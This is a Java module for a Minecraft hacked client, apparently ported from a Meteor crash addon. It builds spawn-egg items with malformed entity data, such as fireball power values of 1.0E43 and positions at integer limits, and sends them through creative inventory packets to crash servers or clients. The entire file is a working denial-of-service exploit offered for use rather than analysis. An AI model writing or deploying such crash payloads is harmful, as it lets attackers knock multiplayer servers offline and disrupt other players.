// Ported from HackVogel/meteor-crash-addon (MIT License)
package thunder.hack.features.modules.crash;

import thunder.hack.features.modules.Module;
import thunder.hack.setting.Setting;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtDouble;
import net.minecraft.nbt.NbtList;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

public class CrashItem extends Module {
    private final Setting<Mode> mode = new Setting<>("Mode", Mode.Fireball);
    private boolean sent = false;

    public CrashItem() {
        super("CrashItem", Category.CRASH);
    }

    @Override
    public void onEnable() {
        sent = false;
    }

    @Override
    public void onUpdate() {
        if (mc.player == null || sent) return;
        if (!mc.player.getAbilities().creativeMode) {
            sendMessage("Requires creative mode");
            disable();
            return;
        }
        sent = true;

        int slot = 36 + mc.player.getInventory().selectedSlot;

        switch (mode.getValue()) {
            case Fireball -> {
                ItemStack stack = new ItemStack(Items.CAVE_SPIDER_SPAWN_EGG);
                NbtCompound tag = new NbtCompound();
                NbtList power = new NbtList();
                power.add(NbtDouble.of(1.0E43));
                power.add(NbtDouble.of(0));
                power.add(NbtDouble.of(0));
                tag.putString("id", "minecraft:small_fireball");
                tag.put("power", power);
                stack.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(tag));
                mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(slot, stack));
            }
            case Skull -> {
                ItemStack stack = new ItemStack(Items.CAVE_SPIDER_SPAWN_EGG);
                NbtCompound tag = new NbtCompound();
                NbtList power = new NbtList();
                power.add(NbtDouble.of(1.0E43));
                power.add(NbtDouble.of(0));
                power.add(NbtDouble.of(0));
                tag.putString("id", "minecraft:wither_skull");
                tag.put("power", power);
                stack.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(tag));
                mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(slot, stack));
            }
            case Arrow -> {
                ItemStack stack = new ItemStack(Items.WITHER_SPAWN_EGG);
                NbtCompound tag = new NbtCompound();
                NbtList power = new NbtList();
                tag.put("power", power);
                stack.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(tag));
                mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(slot, stack));
            }
            case OOBEgg -> {
                ItemStack stack = new ItemStack(Items.CAT_SPAWN_EGG);
                NbtCompound tag = new NbtCompound();
                NbtList pos = new NbtList();
                pos.add(NbtDouble.of(2147483647));
                pos.add(NbtDouble.of(2147483647));
                pos.add(NbtDouble.of(2147483647));
                tag.putString("id", "minecraft:small_fireball");
                tag.put("Pos", pos);
                stack.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(tag));
                mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(slot, stack));
            }
        }
        sendMessage("Crash item given");
        disable();
    }

    @Override
    public void onDisable() {
        sent = false;
    }

    public enum Mode {
        Fireball, Skull, Arrow, OOBEgg
    }
}
